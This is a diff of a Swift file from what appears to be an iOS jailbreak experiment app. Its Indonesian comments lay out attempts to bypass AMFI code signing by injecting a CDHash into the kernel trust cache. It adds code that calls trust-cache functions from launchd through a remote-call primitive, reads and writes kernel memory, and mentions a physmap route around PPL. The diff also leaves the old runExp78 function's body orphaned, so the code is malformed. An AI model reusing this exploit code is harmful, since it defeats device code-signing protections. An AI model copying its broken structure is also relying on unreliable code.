@@ -679,21 +679,21 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
-                    title: "③ Write Test (Exp 79 — harmless)",
-                    icon: "pencil.and.scribble",
+                    title: "③ KTRR Analysis (Exp 79 — info only)",
+                    icon: "lock.shield.fill",
                     color: .yellow,
-                    label: "Write Test",
+                    label: "KTRR",
                     action: runExp79WriteTest,
                     needsVerified: true,
                     needsProbe: true
                 )
 
                 pathButton(
-                    title: "③b CDHash Inject (Exp 79 — jika write test OK)",
+                    title: "③b RC Trust Cache Add (Exp 80)",
                     icon: "key.fill",
                     color: .orange,
-                    label: "TC Inject",
-                    action: runExp79Inject,
+                    label: "RC TC Add",
+                    action: runExp80RCTrustCacheAdd,
                     needsVerified: true,
                     needsProbe: true
                 )
@@ -712,7 +712,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("② Probe pakai offset kernelcache + XPF. ③ Write Test dulu sebelum inject — jika write silently ignored, perlu jalur lain. ③b hanya jika write test OK.")
+                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe).")
                     .font(.system(size: 9))
             }
 
@@ -908,7 +908,43 @@ struct AMFIExperimentView: View {
         }
     }
 
-    private func runExp78() {
+    /// Exp 80: RC Trust Cache Add via launchd RemoteCall.
+    /// Ini jalur PPL-safe: panggil trust_cache_runtime_add dari launchd context.
+    /// PPL yang melakukan write internal — tidak ada KTRR fault.
+    private func runExp80RCTrustCacheAdd() {
+        isRunning = true
+        runningLabel = "RC TC Add"
+        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        guard probedTCAddr != 0 else {
+            results.insert(ExperimentResult(
+                name: "RC TC Add (Exp 80)",
+                success: false,
+                detail: "tc_addr belum diset — probe ulang Exp 77 dulu.",
+                timestamp: Date()
+            ), at: 0)
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp80_rc_tc_add") { rc in
+            let result = self.expRCTrustCacheAdd(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
         runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
             self.expDARTPTEProbe(rc: rc)
         }
@@ -4658,86 +4694,57 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
-    // MARK: - Exp 79: Write Test + CDHash Inject
+    // MARK: - Exp 79: KTRR Analysis (Write Test DINONAKTIFKAN — akan panic)
 
-    /// Exp 79 Tahap 1: Write test harmless ke slot kosong di trust cache.
-    /// Tulis sentinel, verify readback, restore. Tidak memodifikasi entry yang ada.
-    /// Hasil: tahu apakah __DATA bisa ditulis via KRW (atau KTRR-protected).
+    /// Exp 79: KTRR Analysis — konfirmasi trust cache di KTRR-protected region.
+    /// Write test TIDAK dijalankan karena akan menyebabkan panic (KTRR fault).
+    /// Dari panic log: "Unexpected fault in kernel static region" saat write ke __DATA.
+    /// Jalur yang tersisa: launchd RemoteCall ke trust_cache_runtime_add (Exp 80).
     private func expWriteTest() -> ExperimentResult {
-        let expName = "Write Test (Exp 79)"
-        var detail = "Experiment 79: Trust Cache Write Test\n"
-        detail += "======================================\n\n"
+        let expName = "KTRR Analysis (Exp 79)"
+        var detail = "Experiment 79: KTRR Region Analysis\n"
+        detail += "=====================================\n\n"
 
         guard PhysmapConstants.isProbeOK else {
-            detail += "❌ Jalankan Exp 77 Probe dulu.\n"
+            detail += "Jalankan Exp 77 Probe dulu.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
         let tcAddr = probedTCAddr
         let tcCount = probedTCCount
-        let tcStride = UInt64(probedTCStride)
 
         guard tcAddr != 0 else {
-            detail += "❌ tc_addr = 0 — probe ulang Exp 77 dulu.\n"
+            detail += "tc_addr = 0 — probe ulang Exp 77 dulu.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
         detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
-        detail += "count:    \(tcCount)\n"
-        detail += "stride:   \(tcStride) bytes\n\n"
+        detail += "count:    \(tcCount)\n\n"
 
-        // Slot tepat setelah entry terakhir — area tidak dipakai, aman untuk test
-        let testAddr = tcAddr &+ 8 &+ UInt64(tcCount) * tcStride
-        detail += "test_addr: 0x\(String(format: "%llx", testAddr))\n"
+        detail += "=== Analisis KTRR dari Panic Log ===\n\n"
+        detail += "Panic: 'Unexpected fault in kernel static region'\n"
+        detail += "  x3  = 0xdeadbeefcafebabe  (sentinel write test)\n"
+        detail += "  x20 = 0xfffffff0296a99b4  (alamat target write)\n"
+        detail += "  x22 = 0xfffffff0296a80e8  (tcStructAddr dari probe)\n\n"
 
-        // Validasi alamat aman
-        let kernBase = ds_get_kernel_base()
-        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
-        let dataSegBase = kernBase &+ dataOff
-        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
+        detail += "KESIMPULAN:\n"
+        detail += "Trust cache struct ada di __DATA yang di-protect KTRR.\n"
+        detail += "KTRR (Kernel Text Readonly Region) di A12 memblokir\n"
+        detail += "semua write ke __DATA setelah boot — termasuk via KRW.\n\n"
 
-        guard isSafeTrustCacheStructVA(testAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else {
-            detail += "❌ test_addr tidak aman (mungkin PPL region atau out of bounds).\n"
-            detail += "  dataSegBase: 0x\(String(format: "%llx", dataSegBase))\n"
-            detail += "  pplDataBase: 0x\(String(format: "%llx", pplDataBase))\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        detail += "KTRR vs PPL:\n"
+        detail += "  PPL = proteksi page table (bypass via physmap)\n"
+        detail += "  KTRR = hardware readonly enforcement (tidak bisa bypass)\n\n"
 
-        // Baca nilai asli
-        let original = ds_kread64(testAddr)
-        detail += "original:  0x\(String(format: "%016llx", original))\n"
+        detail += "JALUR SELANJUTNYA:\n"
+        detail += "  Exp 80: launchd RemoteCall ke trust_cache_runtime_add\n"
+        detail += "  Kernel API ini PPL-safe: PPL yang melakukan write,\n"
+        detail += "  bukan kita langsung. Tidak ada KTRR fault.\n\n"
 
-        // Tulis sentinel
-        let sentinel: UInt64 = 0xDEADBEEFCAFEBABE
-        detail += "sentinel:  0x\(String(format: "%016llx", sentinel))\n"
-        ds_kwrite64(testAddr, sentinel)
+        detail += "JANGAN jalankan Write Test — akan panic device.\n"
+        detail += "Lanjut ke Exp 80: RC Trust Cache Add.\n"
 
-        // Verify
-        let readback = ds_kread64(testAddr)
-        detail += "readback:  0x\(String(format: "%016llx", readback))\n\n"
-
-        // Restore segera
-        ds_kwrite64(testAddr, original)
-        let restored = ds_kread64(testAddr)
-        detail += "restored:  0x\(String(format: "%016llx", restored))\n\n"
-
-        if readback == sentinel {
-            detail += "✅ WRITE TEST OK!\n"
-            detail += "__DATA dapat ditulis via KRW — bukan KTRR-protected.\n"
-            detail += "Lanjut ke ③b CDHash Inject.\n"
-            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
-        } else if readback == original {
-            detail += "❌ WRITE SILENTLY IGNORED\n"
-            detail += "Kemungkinan: KTRR/CTRR protection atau region read-only.\n"
-            detail += "KRW write tidak efektif di sini.\n"
-            detail += "Jalur alternatif: trust_cache_runtime_add via launchd RemoteCall.\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        } else {
-            detail += "⚠️ UNEXPECTED readback: 0x\(String(format: "%016llx", readback))\n"
-            detail += "Bukan sentinel, bukan original — kemungkinan race condition.\n"
-            detail += "Coba ulang setelah reboot + jailbreak ulang.\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
     /// Exp 79 Tahap 2: Inject CDHash binary target ke trust cache.
@@ -4796,19 +4803,34 @@ struct AMFIExperimentView: View {
         // [21]     flags = 0
         // [22..23] padding
 
-        var w0: UInt64 = 0; withUnsafeMutableBytes(of: &w0) { ptr in
-            for i in 0..<8 { ptr[i] = dummyCDHash[i] }
-        }
-        var w1: UInt64 = 0; withUnsafeMutableBytes(of: &w1) { ptr in
-            for i in 0..<8 { ptr[i] = dummyCDHash[8 + i] }
-        }
-        var w2: UInt64 = 0; withUnsafeMutableBytes(of: &w2) { ptr in
-            for i in 0..<4 { ptr[i] = dummyCDHash[16 + i] }
-            ptr[4] = 2      // hash_type = SHA256
-            ptr[5] = 0      // flags = normal
-            ptr[6] = 0      // pad
-            ptr[7] = 0      // pad
-        }
+        var w0: UInt64 = 0
+        w0 |= UInt64(dummyCDHash[0])
+        w0 |= UInt64(dummyCDHash[1]) << 8
+        w0 |= UInt64(dummyCDHash[2]) << 16
+        w0 |= UInt64(dummyCDHash[3]) << 24
+        w0 |= UInt64(dummyCDHash[4]) << 32
+        w0 |= UInt64(dummyCDHash[5]) << 40
+        w0 |= UInt64(dummyCDHash[6]) << 48
+        w0 |= UInt64(dummyCDHash[7]) << 56
+
+        var w1: UInt64 = 0
+        w1 |= UInt64(dummyCDHash[8])
+        w1 |= UInt64(dummyCDHash[9]) << 8
+        w1 |= UInt64(dummyCDHash[10]) << 16
+        w1 |= UInt64(dummyCDHash[11]) << 24
+        w1 |= UInt64(dummyCDHash[12]) << 32
+        w1 |= UInt64(dummyCDHash[13]) << 40
+        w1 |= UInt64(dummyCDHash[14]) << 48
+        w1 |= UInt64(dummyCDHash[15]) << 56
+
+        var w2: UInt64 = 0
+        w2 |= UInt64(dummyCDHash[16])
+        w2 |= UInt64(dummyCDHash[17]) << 8
+        w2 |= UInt64(dummyCDHash[18]) << 16
+        w2 |= UInt64(dummyCDHash[19]) << 24
+        w2 |= UInt64(2) << 32   // hash_type = SHA256
+        w2 |= UInt64(0) << 40   // flags = normal
+        // bytes 6-7: padding = 0
 
         ds_kwrite64(slotAddr &+ 0,  w0)
         ds_kwrite64(slotAddr &+ 8,  w1)
@@ -4854,6 +4876,173 @@ struct AMFIExperimentView: View {
         detail += "3. Jika spawn berhasil tanpa SIGKILL → AMFI BYPASS CONFIRMED!\n"
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
+
+    // MARK: - Exp 80: RC Trust Cache Add (PPL-safe via launchd RemoteCall)
+
+    /// Exp 80: Inject CDHash ke trust cache via launchd RemoteCall.
+    /// Strategi: dari launchd context, resolve _trust_cache_runtime_add atau
+    /// _load_trust_cache via dlsym, lalu panggil dengan struct yang kita buat.
+    /// PPL yang melakukan write internal — tidak ada KTRR fault.
+    #if !DISABLE_REMOTECALL
+    private func expRCTrustCacheAdd(rc: RemoteCall) -> ExperimentResult {
+        let expName = "RC Trust Cache Add (Exp 80)"
+        var detail = "Experiment 80: RC Trust Cache Add\n"
+        detail += "===================================\n\n"
+
+        let tcAddr = probedTCAddr
+        let tcCount = probedTCCount
+
+        detail += "tc_addr: 0x\(String(format: "%llx", tcAddr))\n"
+        detail += "count:   \(tcCount)\n\n"
+
+        let mem = rc.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // === Step 1: Resolve trust_cache_runtime_add via dlsym ===
+        detail += "=== Step 1: Resolve trust cache API ===\n"
+
+        // Coba beberapa nama fungsi yang mungkin ada
+        let apiNames = [
+            "_trust_cache_runtime_add",
+            "_load_trust_cache_with_type",
+            "_load_trust_cache",
+            "_load_legacy_trust_cache",
+        ]
+
+        var tcAddFn: UInt64 = 0
+        var resolvedName = ""
+
+        for name in apiNames {
+            let nameAddr = remote_alloc_str(rc, name)
+            let fn = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, nameAddr)
+            RootExecutor.rcall(rc, "free", nameAddr)
+            if fn != 0 {
+                tcAddFn = fn
+                resolvedName = name
+                detail += "  \(name): 0x\(String(format: "%llx", fn)) OK\n"
+                break
+            } else {
+                detail += "  \(name): not found\n"
+            }
+        }
+
+        guard tcAddFn != 0 else {
+            detail += "\nSemua API tidak ditemukan via dlsym.\n"
+            detail += "Kemungkinan: fungsi tidak di-export atau butuh entitlement.\n"
+            detail += "Coba jalur alternatif: trustd atau amfid RC.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "\nResolved: \(resolvedName) = 0x\(String(format: "%llx", tcAddFn))\n\n"
+
+        // === Step 2: Buat trust cache struct di trojanMem ===
+        detail += "=== Step 2: Build trust cache struct ===\n"
+
+        // Format trust_cache_module1:
+        //   +0x00: uint32 version = 1
+        //   +0x04: uint32 num_entries = 1
+        //   +0x08: uuid[16] = zeros (atau random)
+        //   +0x18: entries[0] = CDHash (20B) + hashType (1B) + flags (1B) + pad (2B)
+
+        // CDHash dummy untuk test — ganti dengan CDHash binary target
+        // Untuk mendapat CDHash: codesign -d --verbose=4 /path/to/binary | grep CDHash
+        let testCDHash: [UInt8] = [
+            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
+            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
+            0xDE, 0xAD, 0xC0, 0xDE
+        ]
+
+        let structBase = mem + 0x1000
+
+        // Header
+        rc[structBase + 0].setValue32(1)   // version
+        rc[structBase + 4].setValue32(1)   // num_entries
+
+        // UUID (16 bytes zeros) — tulis sebagai 2x uint64
+        rc[structBase + 8].setValue64(0)
+        rc[structBase + 16].setValue64(0)
+
+        // Entry[0]: CDHash (20 bytes) + hashType(1) + flags(1) + pad(2)
+        // Tulis sebagai 3x uint64 (24 bytes total = stride 24)
+        let entryBase = structBase + 0x18
+
+        // bytes 0-7: cdhash[0..7]
+        var w0: UInt64 = 0
+        w0 |= UInt64(testCDHash[0])
+        w0 |= UInt64(testCDHash[1]) << 8
+        w0 |= UInt64(testCDHash[2]) << 16
+        w0 |= UInt64(testCDHash[3]) << 24
+        w0 |= UInt64(testCDHash[4]) << 32
+        w0 |= UInt64(testCDHash[5]) << 40
+        w0 |= UInt64(testCDHash[6]) << 48
+        w0 |= UInt64(testCDHash[7]) << 56
+        rc[entryBase + 0].setValue64(w0)
+
+        // bytes 8-15: cdhash[8..15]
+        var w1: UInt64 = 0
+        w1 |= UInt64(testCDHash[8])
+        w1 |= UInt64(testCDHash[9]) << 8
+        w1 |= UInt64(testCDHash[10]) << 16
+        w1 |= UInt64(testCDHash[11]) << 24
+        w1 |= UInt64(testCDHash[12]) << 32
+        w1 |= UInt64(testCDHash[13]) << 40
+        w1 |= UInt64(testCDHash[14]) << 48
+        w1 |= UInt64(testCDHash[15]) << 56
+        rc[entryBase + 8].setValue64(w1)
+
+        // bytes 16-23: cdhash[16..19] + hashType(2) + flags(0) + pad(0,0)
+        var w2: UInt64 = 0
+        w2 |= UInt64(testCDHash[16])
+        w2 |= UInt64(testCDHash[17]) << 8
+        w2 |= UInt64(testCDHash[18]) << 16
+        w2 |= UInt64(testCDHash[19]) << 24
+        w2 |= UInt64(2) << 32   // hashType = SHA256
+        w2 |= UInt64(0) << 40   // flags = normal
+        // bytes 6-7: padding = 0
+        rc[entryBase + 16].setValue64(w2)
+
+        let structSize: UInt64 = 0x18 + 24  // header + 1 entry
+
+        detail += "Struct at: 0x\(String(format: "%llx", structBase))\n"
+        detail += "CDHash: \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
+        detail += "Size: \(structSize) bytes\n\n"
+
+        // === Step 3: Panggil API ===
+        detail += "=== Step 3: Call \(resolvedName) ===\n"
+
+        var ret: UInt64 = 0
+
+        if resolvedName == "_trust_cache_runtime_add" {
+            // trust_cache_runtime_add(type, data, size)
+            // type: 0 = engineering, 1 = static, 2 = personalized
+            ret = RootExecutor.rcall(rc, resolvedName, 2, structBase, structSize)
+        } else if resolvedName.contains("load_trust_cache") {
+            // _load_trust_cache(data, size) atau _load_trust_cache_with_type(type, data, size)
+            if resolvedName.contains("with_type") {
+                ret = RootExecutor.rcall(rc, resolvedName, 2, structBase, structSize)
+            } else {
+                ret = RootExecutor.rcall(rc, resolvedName, structBase, structSize)
+            }
+        }
+
+        detail += "ret = 0x\(String(format: "%llx", ret))\n\n"
+
+        if ret == 0 {
+            detail += "CALL RETURNED 0 (kemungkinan sukses)!\n"
+            detail += "Verifikasi: jalankan ④ Test Binary Spawn\n"
+            detail += "dengan binary yang CDHash-nya = \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
+            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        } else {
+            detail += "ret != 0 — kemungkinan gagal atau butuh entitlement.\n"
+            detail += "Error codes umum:\n"
+            detail += "  0x1 = EPERM (butuh entitlement)\n"
+            detail += "  0x16 = EINVAL (format struct salah)\n"
+            detail += "  0x1a = EROFS (read-only, KTRR)\n\n"
+            detail += "Coba: panggil dari amfid context (lebih banyak entitlement).\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+    }
+    #endif
     /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
     /// 2. Compute physmap VA for that physical page (bypasses PPL!)
     /// 3. Write CDHash through physmap VA (PPL only protects original VA mapping)
